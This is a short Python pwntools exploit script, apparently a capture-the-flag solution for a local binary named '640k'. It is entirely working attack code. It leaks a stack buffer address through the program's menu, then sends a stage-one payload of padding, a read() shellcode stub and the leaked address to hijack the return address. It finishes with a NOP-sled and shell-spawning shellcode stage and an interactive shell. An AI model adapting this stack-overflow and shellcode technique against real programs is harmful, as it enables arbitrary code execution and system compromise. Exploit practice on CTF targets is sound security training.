#!/usr/bin/env python
from pwn import *

def leakBufAddr(index):
	p.sendline('1')
	p.recvuntil(':')
	p.sendline(str(index))
	p.recvuntil('addr: ')
	addr = p.recvuntil(' ')
	print addr
	p.recvuntil('Give option:')
	return int(addr, 16)

def sendPayload(pl):
	p.sendline('2')
	p.sendline(pl)
	p.sendline('3')
	p.recvuntil('Give option:')
	p.recvuntil('Exit.')

ret_offset = 20
buf_addr = 0
payload = ''

p = process('./640k')
p.recvuntil('Give option:')

# Stage 1
buf_addr = leakBufAddr(8)
sc = asm(shellcraft.read(0, buf_addr + ret_offset, 200))
payload += 'A' * (ret_offset - len(sc))
payload += sc
payload += p32(buf_addr)
sendPayload(payload)

# gdb.attach(p)
# raw_input("Enter to continue")

# Stage 2
payload = ''
sc = asm(shellcraft.sh())
payload += '\x90' * (200 - len(sc))
payload += sc

p.sendline(payload)
p.interactive()
